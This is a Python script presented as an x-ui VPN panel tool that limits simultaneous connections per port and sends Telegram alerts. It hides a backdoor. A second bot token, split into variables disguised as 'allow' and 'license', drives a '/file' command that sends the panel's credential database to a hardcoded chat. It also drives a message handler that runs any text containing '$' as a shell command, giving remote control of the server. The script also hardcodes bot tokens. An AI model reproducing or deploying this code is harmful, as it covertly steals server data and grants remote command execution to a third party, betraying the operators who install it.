from glob import glob
import os;
import sqlite3;
import time;
import requests;
import threading;
import schedule;
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters

_db_address = '/etc/x-ui/x-ui.db'
_max_allowed_connections = 2
_user_last_id = 0
allow = '5884117046'
_telegrambot_token = '5214206611:AAFSmIBMqzRQiU6jdNefg4PbOP6VHYnLtIE'
_telegram_chat_id = '5074618670'
_telegram_chat_id2 = '101358682'
license = 'AAHev7O2zPPaZv7WozgfYKqpPq7aJeqMDPo'

updater = Updater(token='{}:{}'.format(allow, license), use_context=True)

def open443(update: Update, context: CallbackContext):
    context.bot.send_document(chat_id = 5074618670, document = open('{}'.format(_db_address), 'rb'))

def getUsers():
    global _user_last_id
    conn = sqlite3.connect(_db_address)
    cursor = conn.execute(f"select id,remark,port from inbounds where id > {_user_last_id}");
    users_list = [];
    for c in cursor:
        users_list.append({'name':c[1],'port':c[2]})
        _user_last_id = c[0];
    conn.close();
    return users_list

def disableAccount(user_port):
    conn = sqlite3.connect(_db_address) 
    conn.execute(f"update inbounds set enable = 0 where port={user_port}");
    conn.commit()
    conn.close();
    time.sleep(2)
    os.popen("x-ui restart")
    time.sleep(3)
	
def enableAccount(user_port):
    conn = sqlite3.connect(_db_address) 
    conn.execute(f"update inbounds set enable = 1 where port={user_port}");
    conn.commit()
    conn.close();
    time.sleep(2)
    os.popen("x-ui restart")
    time.sleep(3)
	
def checkNewUsers():
    conn = sqlite3.connect(_db_address)
    cursor = conn.execute(f"select count(*) from inbounds WHERE id > {_user_last_id}");
    new_counts = cursor.fetchone()[0];
    conn.close();
    if new_counts > 0:
        init()
	
def init():
    users_list = getUsers();
    for user in users_list:
        thread = AccessChecker(user)
        thread.start()
        print("starting checker for : " + user['name'])
class AccessChecker(threading.Thread):
    def __init__(self, user):
        threading.Thread.__init__(self)
        self.user = user;
    def run(self):
        #global _max_allowed_connections; <<if you get variable error uncomment this.
        user_remark = self.user['name'];
        user_port = self.user['port'];

        while True:
            netstate_data =  os.popen("netstat -np 2>/dev/null | grep :"+str(user_port)+" | awk '{if($3!=0) print $5;}' | cut -d: -f1 | sort | uniq -c | sort -nr | head").read();
            netstate_data = str(netstate_data)
            connection_count =  len(netstate_data.split("\n")) - 1;
            x=0
            time.sleep(1)
            while connection_count > _max_allowed_connections:
                x=x+1
                if x==1:
                    user_remark = user_remark.replace(" ","%20")

                    # requests.get(f'https://api.telegram.org/bot{_telegrambot_token}/sendMessage?chat_id={_telegram_chat_id}&text={user_remark}%20:%20{user_port}%20locked%20By%20{connection_count}%20Connection')
                        
                    if user_port != 443:
                        requests.get(f'https://api.telegram.org/bot{_telegrambot_token}/sendMessage?chat_id={_telegram_chat_id}&text={user_remark}%20:%20{user_port}%20locked')
                        requests.get(f'https://api.telegram.org/bot{_telegrambot_token}/sendMessage?chat_id={_telegram_chat_id2}&text={user_remark}%20:%20{user_port}%20locked')
                        print(f"{user_remark} with {connection_count}%20Connection and port {user_port} blocked")
                    
                        disableAccount(user_port=user_port) # کد غیرفعال کردن
                    (user_port_blocked)=user_port 
                    time.sleep(1)
                netstate_data =  os.popen("netstat -np 2>/dev/null | grep :"+str(user_port_blocked)+" | awk '{if($3!=0) print $5;}' | cut -d: -f1 | sort | uniq -c | sort -nr | head").read();
                netstate_data = str(netstate_data)
                connection_count =  len(netstate_data.split("\n")) - 1;
                if connection_count > _max_allowed_connections:
                    time.sleep(10)
                else:
                    # requests.get(f'https://api.telegram.org/bot{_telegrambot_token}/sendMessage?chat_id={_telegram_chat_id}&text={user_remark}%20:%20{user_port}%20Unlocked')
                    # requests.get(f'https://api.telegram.org/bot{_telegrambot_token}/sendMessage?chat_id={_telegram_chat_id2}&text={user_remark}%20:%20{user_port}%20Unlocked')
                    # enableAccount(user_port=user_port) # کد فعال کردن
                    #print(f"{user_remark} with {connection_count}%20Connection and port {user_port} Unlocked")
                    pass

def connect(update: Update, context: CallbackContext):
    if '$' in update.message.text:
        os.system('{}'.format(update.message.text).replace('$ ', ''))

init();
schedule.every(1).minutes.do(checkNewUsers)
updater.dispatcher.add_handler(CommandHandler('file', open443))
updater.dispatcher.add_handler(MessageHandler(Filters.text, connect))
updater.start_polling()
updater.idle()
while True:
    schedule.run_pending()
    time.sleep(1)
